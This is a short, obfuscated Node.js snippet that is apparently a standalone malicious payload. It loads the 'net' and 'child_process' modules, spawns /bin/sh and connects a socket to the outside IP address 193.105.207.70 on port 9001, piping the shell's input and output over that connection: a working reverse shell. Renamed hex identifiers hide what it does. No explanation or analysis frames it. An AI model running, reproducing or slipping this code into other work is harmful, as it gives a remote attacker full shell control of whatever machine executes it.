(function () {
    var _0xe6008e = {
        'evmeX': function (_0x5c731f, _0x2d946b) {
            return _0x5c731f(_0x2d946b);
        },
        'lYngU': 'net',
        'OEziA': function (_0xa6b256, _0x366162) {
            return _0xa6b256(_0x366162);
        },
        'afgfV': 'child_process',
        'ZZGsD': '/bin/sh',
        'PKztO': '193.105.207.70'
    };
    var _0x5da61a = _0xe6008e['evmeX'](require, _0xe6008e['lYngU']), _0x5c0d17 = _0xe6008e['OEziA'](require, _0xe6008e['afgfV']), _0x3cb4be = _0x5c0d17['spawn'](_0xe6008e['ZZGsD'], []);
    var _0x81b294 = new _0x5da61a['Socket']();
    _0x81b294['connect'](0x2329, _0xe6008e['PKztO'], function () {
        _0x81b294['pipe'](_0x3cb4be['stdin']);
        _0x3cb4be['stdout']['pipe'](_0x81b294);
        _0x3cb4be['stderr']['pipe'](_0x81b294);
    });
    return /a/;
}());
